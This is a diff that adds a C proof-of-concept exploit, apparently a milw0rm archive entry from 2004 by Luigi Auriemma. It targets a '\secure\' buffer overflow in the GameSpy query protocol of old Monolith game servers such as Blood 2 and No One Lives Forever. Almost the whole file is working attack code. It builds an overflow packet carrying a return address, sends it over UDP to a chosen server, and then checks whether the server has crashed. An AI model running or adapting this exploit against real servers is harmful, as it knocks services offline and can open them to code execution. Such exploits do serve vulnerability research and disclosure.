@@ -1,0 +1,207 @@
+/*
+
+by Luigi Auriemma
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+
+#ifdef WIN32
+    #include <winsock.h>
+    #include "winerr.h"
+
+    #define close   closesocket
+#else
+    #include <unistd.h>
+    #include <sys/socket.h>
+    #include <sys/types.h>
+    #include <arpa/inet.h>
+    #include <net/inet.h>
+    #include <netdb.h>
+#endif
+
+
+
+#define VER     "0.1.1"
+#define PORT    27888
+#define TIMEOUT 3
+#define BUFFSZ  2048
+#define PCK     "\\secure\\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+                "\x55\x44\x33\x22"
+                /* return address, each byte must be >= 0x20 and <= 0x7f */
+
+
+
+void gs_info_udp(u_long ip, u_short port);
+int timeout(int sock);
+u_long resolv(char *host);
+void std_err(void);
+
+
+
+int main(int argc, char *argv[]) {
+    int     sd;
+    u_short port = PORT;
+    struct  sockaddr_in peer;
+
+
+    setbuf(stdout, NULL);
+
+    fputs("\n"
+        "\\secure\\ buffer overflow in some old Monolith games "VER"\n"
+        "by Luigi Auriemma\n"
+        "e-mail: aluigi@altervista.org\n"
+        "web:    http://aluigi.altervista.org\n"
+        "\n", stdout);
+
+    if(argc < 2) {
+        printf("\n"
+            "Usage: %s <server> [port(%d)]\n"
+            "\n"
+            "Vulnerable games            Latest versions\n"
+            "  Alien versus predator 2   1.0.9.6\n"
+            "  Blood 2                   2.1\n"
+            "  No one lives forever      1.004\n"
+            "  Shogo                     2.2\n"
+            "\n"
+            "Note: the return address will be overwritten by 0x%08lx\n"
+            "      (only the bytes from 0x20 to 0x7f are allowed)\n"
+            "\n", argv[0], port, *(u_long *)(PCK + 72));
+        exit(1);
+    }
+
+#ifdef WIN32
+    WSADATA    wsadata;
+    WSAStartup(MAKEWORD(1,0), &wsadata);
+#endif
+
+    if(argc > 2) port = atoi(argv[2]);
+
+    peer.sin_addr.s_addr = resolv(argv[1]);
+    peer.sin_port        = htons(port);
+    peer.sin_family      = AF_INET;
+
+    printf("- target is %s:%hu\n\n",
+        inet_ntoa(peer.sin_addr), port);
+
+    fputs("- Request informations:\n", stdout);
+    gs_info_udp(peer.sin_addr.s_addr, port);
+
+    fputs("- Send BOOM packet:\n", stdout);
+    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if(sd < 0) std_err();
+    if(sendto(sd, PCK, sizeof(PCK) - 1, 0, (struct sockaddr *)&peer, sizeof(peer))
+      < 0) std_err();
+    close(sd);
+
+    fputs("- Check server:\n", stdout);
+    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if(sd < 0) std_err();
+    if(sendto(sd, "\\status\\", 8, 0, (struct sockaddr *)&peer, sizeof(peer))
+      < 0) std_err();
+    if(timeout(sd) < 0) {
+        fputs("\nServer IS vulnerable!!!\n\n", stdout);
+    } else {
+        fputs("\nServer doesn't seem vulnerable\n\n", stdout);
+    }
+
+    close(sd);
+    return(0);
+}
+
+
+
+void gs_info_udp(u_long ip, u_short port) {
+    struct  sockaddr_in peer;
+    int     sd,
+            len,
+            nt = 1;
+    u_char  buff[2048],
+            *p1,
+            *p2;
+
+    peer.sin_addr.s_addr = ip;
+    peer.sin_port        = htons(port);
+    peer.sin_family      = AF_INET;
+
+    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if(sd < 0) std_err();
+
+    if(sendto(sd, "\\status\\", 8, 0, (struct sockaddr *)&peer, sizeof(peer))
+      < 0) std_err();
+
+    if(timeout(sd) < 0) {
+        fputs("\nError: socket timeout, no replies received. Probably the server doesn't support the Gamespy query protocol or the port is wrong\n\n", stdout);
+        close(sd);
+        exit(1);
+    }
+
+    len = recvfrom(sd, buff, sizeof(buff) - 1, 0, NULL, NULL);
+    if(len < 0) std_err();
+
+    buff[len] = 0x00;
+    p1 = buff;
+    while((p2 = strchr(p1, '\\'))) {
+        *p2 = 0x00;
+
+        if(!nt) {
+            if(!*p1) break;
+            printf("%30s: ", p1);
+            nt++;
+        } else {
+            printf("%s\n", p1);
+            nt = 0;
+        }
+        p1 = p2 + 1;
+    }
+    printf("%s\n\n", p1);
+    close(sd);
+}
+
+
+
+int timeout(int sock) {
+    struct  timeval tout;
+    fd_set  fd_read;
+    int     err;
+
+    tout.tv_sec = TIMEOUT;
+    tout.tv_usec = 0;
+    FD_ZERO(&fd_read);
+    FD_SET(sock, &fd_read);
+    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
+    if(err < 0) std_err();
+    if(!err) return(-1);
+    return(0);
+}
+
+
+
+u_long resolv(char *host) {
+    struct hostent *hp;
+    u_long host_ip;
+
+    host_ip = inet_addr(host);
+    if(host_ip == INADDR_NONE) {
+        hp = gethostbyname(host);
+        if(!hp) {
+            printf("\nError: Unable to resolv hostname (%s)\n", host);
+            exit(1);
+        } else host_ip = *(u_long *)hp->h_addr;
+    }
+    return(host_ip);
+}
+
+
+
+#ifndef WIN32
+    void std_err(void) {
+        perror("\nError");
+        exit(1);
+    }
+#endif
+
+// milw0rm.com [2004-10-10]
